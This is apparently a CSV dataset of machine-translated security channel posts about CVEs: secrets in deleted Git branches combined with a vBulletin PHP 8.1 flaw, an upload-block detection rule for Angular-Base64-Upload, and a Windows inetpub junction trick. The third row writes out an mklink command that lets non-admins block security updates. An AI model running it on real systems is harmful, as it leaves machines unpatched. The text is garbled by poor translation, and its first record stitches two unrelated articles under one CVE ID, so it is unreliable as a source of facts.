77,CVE-2022-24975,sec_devops,"Phantom Secrets: Undetated Secrets Expose Major Corporations recently we have touched on the topic of the appearance of secrets in unexpected places such as binary files. Today we will discuss the detection of secrets in remote branches of public repositories. IN . Why are the branches really not remove and extracted through` Git Clone –Mirror`? In short, the remote branches in Git are not completely removed, since they can be useful for restoring data or the history of changes. This is due to the fact that GIT, in its plan, should maintain maximum availability and the ability to restore data even after their deletion at the local level. When you remove the local branch, remote branches can remain in the form of ""hanging"" links to a remote repository. These links can be extracted when using the `Git Clone --mirror 'command, as it clones all links, including those that were deleted locally. This phenomenon even has a disputed one. The conclusion is quite simple: the secret that once got into the repository can be considered automatically compromised. For many, the use of this approach will not be something new. Accordingly, use the functions of protecting against random communities from your SCM and Pre-Commit Khuki to avoid the appearance of secrets in repositories. If this still happened, then, according to the article, technical support can help. By the way, following the article by Gitleaks and Trufflehog added support for scanning through ``Mirror`.

It affects Vbulletin from 5.0.0 to 5.7.5 and from 6.0.0 to 6.0.3 versions that work on PHP 8.1 and above. Vbulletin is a commercial platform for creating forums and communities on sites. It works in PHP and uses MySQL databases. Base Core metrics: 10 CWE: CWE-424 Vulnerability details The main critical problem is a change in behavior `Reflection API` B` `Php 8.1. Traditionally, the ReflectionMethod class in PHP required a clear resolution - through `setaccessible` a call of protected or closed methods. But starting with PHP 8.1, this restriction is softened: `reflectionMethod :: invoke`. Now, by default, you can call protected and closed methods. API vbulletin provides end points in the format: `` `/Ajax/API //` `` They implement the routing of requests to controllers using Reflection API. Access control is carried out at the method level, not globally. The endpoints can be transmitted both in the URI and the Routestring post-posting parameter.

104,CVE-2024-42640,four_rays,"How to detect the operation of the CVE-2024-42640 not so long ago it became known about the vulnerability in Angular-Base64-Upload, which is called the CVE-2024-42640. This vulnerability allows the attacker to download arbitrary files to the server. All versions are affected to 0.1.21. So, if your application is written using an Angular framework, we strongly recommend checking the versions. During the emulation of this activity, the SOLAR 4RAYS team became obvious that the operation of vulnerability involves loading an arbitrary file on a server, to which you can subsequently access through `/uploads`. These actions lead to the possibility of performing an arbitrary code on the target server. We will share the detective logic, which will allow you to block the operation of this vulnerability: 1. Block all `post` requests for URI containing` demo/server.php` and bodya transmitting a file with extensive expansion, for example `` `PHP | SH | EXE | PL | jSP | ASP | Bash | pHP+| pht | pHPT | PHTML | ASPX`` 2.

311,CVE-2025-21204,EchelonEyes,"The new vulnerability in Windows can block the updates of the system of a fresh security patch from Microsoft, released as part of the April Patch Tuesday, carries an unexpected side effect with it. After installing updates on the system disk, a folder C: \ InetPub, belonging to the System account, is created. Although its appearance is part of the correction of the vulnerabilities of the CVE-2025-21204, it opens a new gap that attackers can use. How does this work? The famous cybersecurity expert Kevin Bomont found that this folder can be used to block future Windows updates. Even users without the rights of the administrator can create the so -called Junction between C: \ InetPub and any file in the system, for example, C: \ Windows \ System32 \ Notepad.exe. To do this, just execute the command: Mklink /J C: \ Inetpub C: \ Windows \ System32 \ Notepad.exe after creating such a redirect, the attempt to install new updates will end with an error with the code 0x800f081F. This is due to the fact that the system expects to see in C: \ Inetpub folder, not a file. Because of this, the update process ""breaks"", and the system cannot continue the installation. Why is it dangerous? Attackers can take advantage of this vulnerability to block important security updates on target devices. This is especially critical for corporate networks, where the absence of timely patches can lead to serious consequences, including compromising data or the distribution of malicious software. What does Microsoft say? Microsoft recognized the problem, but classified it as an average seriousness. The company said that it does not plan to immediately correct it, since updates can still be installed if the created Junction and repeat the attempt. However, this requires manual intervention, which makes the situation less convenient for users. How to protect yourself? 1) Do not remove the C: \ InetPub folder if it was created after installing the updates. This is part of the CVE-2025-21204 correction. 2) track the creation of Junctions or a change in system files, for example, using Komrad Enterprise Siem (3), update the systems regularly: if you encounter an error when installing updates, check if there are redamages like C: \ InetPub. #Windows #vulnerabilities #microsoft Source:",2025-06-01 01:37:15.969961,https://t.me/EchelonEyes/3836
